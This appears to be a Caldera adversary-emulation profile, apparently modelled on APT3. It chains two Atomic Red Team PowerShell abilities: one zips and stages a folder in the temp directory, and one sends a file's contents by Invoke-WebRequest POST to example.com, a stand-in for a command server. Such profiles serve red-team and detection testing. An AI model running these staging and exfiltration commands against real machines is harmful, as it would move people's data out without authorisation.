adversary_id: custom_adversary_profile__APT_3__APT3_Phase3_Pattern_2__2023-10-19-22_37_47
name: Custom Adversary Profile
description: [['stockpile__collection', 'atomic__collection'], ['stockpile__exfiltration', 'atomic__exfiltration']]
atomic_ordering:
- 37f38e52527d57d5535adb97c7295448 # ('37f38e52527d57d5535adb97c7295448', 'None', 'validate_me') ; {'description': 'Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip\nwas placed in the temp directory.\n', 'tactic': 'collection', 'technique': {'attack_id': 'T1074.001', 'name': 'Data Staged: Local Data Staging'}, 'platforms': {'windows': {'psh': {'cleanup': 'Remove-Item -Path $env:TEMP\\Folder_to_zip.zip -ErrorAction Ignore', 'command': 'Compress-Archive -Path PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip -DestinationPath $env:TEMP\\Folder_to_zip.zip -Force', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['37f38e52527d57d5535adb97c7295448', 'None', 'validate_me'], 'plugin': 'atomic'}
- ac4d31cae06889fe70ed9464748c970a # ('ac4d31cae06889fe70ed9464748c970a', 'None', 'validate_me') ; {'description': 'Exfiltrates a file present on the victim machine to the C2 server.\n', 'tactic': 'exfiltration', 'technique': {'attack_id': 'T1041', 'name': 'Exfiltration Over C2 Channel'}, 'platforms': {'windows': {'psh': {'cleanup': '', 'command': 'if(-not (Test-Path $env:TEMP\\LineNumbers.txt)){ ;   1..100 | ForEach-Object { Add-Content -Path $env:TEMP\\LineNumbers.txt -Value "This is line $_." }; }; [System.Net.ServicePointManager]::Expect100Continue = $false; $filecontent = Get-Content -Path $env:TEMP\\LineNumbers.txt; Invoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['ac4d31cae06889fe70ed9464748c970a', 'None', 'validate_me'], 'plugin': 'atomic'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []